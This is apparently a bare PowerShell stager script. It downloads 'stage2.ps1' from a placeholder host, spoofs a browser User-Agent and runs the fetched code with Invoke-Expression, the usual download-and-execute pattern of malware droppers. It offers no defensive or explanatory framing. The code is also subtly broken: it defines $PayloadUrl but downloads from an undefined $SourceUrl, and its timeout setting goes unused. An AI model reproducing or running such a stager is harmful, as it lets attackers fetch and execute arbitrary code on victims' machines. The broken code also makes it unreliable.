
$PayloadUrl = 'http://adatum.com/stage2.ps1'
$ConnectionTimeout = 171
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$DownloadedScript = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($DownloadedScript)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $DownloadedScript.Length)
Invoke-Expression $DownloadedScript

$ProgressPreference = "SilentlyContinue"
